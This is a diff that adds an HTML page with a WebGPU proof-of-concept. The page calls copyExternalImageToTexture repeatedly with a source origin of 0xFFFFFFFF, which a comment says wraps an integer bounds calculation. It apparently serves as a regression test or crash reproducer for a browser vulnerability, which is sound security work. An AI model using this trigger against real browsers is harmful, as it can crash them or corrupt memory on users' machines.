@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <script>
+        (async () => {
+            if (!navigator.gpu)
+                throw new Error("WebGPU unavailable");
+
+            const adapter = await navigator.gpu.requestAdapter();
+            const device = await adapter.requestDevice();
+            const queue = device.queue;
+
+            const texture = device.createTexture({
+                size: [1, 1, 1],
+                format: "rgba8unorm",
+                usage: GPUTextureUsage.COPY_DST | GPUTextureUsage.RENDER_ATTACHMENT,
+            });
+
+            const pixel = new Uint8ClampedArray([255, 0, 0, 255]);
+            const image = new ImageData(pixel, 1, 1);
+
+            const extent = { width: 1, height: 1, depthOrArrayLayers: 1 };
+            const destination = {
+                texture,
+                mipLevel: 0,
+                origin: { x: 0, y: 0, z: 0 },
+                premultipliedAlpha: false,
+            };
+
+            const exploitOrigin = 0xFFFFFFFF; // wraps when added to any non-zero copySize component
+
+            const source = {
+                source: image,
+                origin: { x: exploitOrigin, y: 0 },
+                flipY: false,
+            };
+
+            try {
+                for (let i = 0; i < 100; ++i)
+                    queue.copyExternalImageToTexture(source, destination, extent);
+            } catch (ex) {
+                console.log(ex);
+            }
+
+            await queue.onSubmittedWorkDone();
+        })();
+
+    </script>
+</body>
+
+</html>
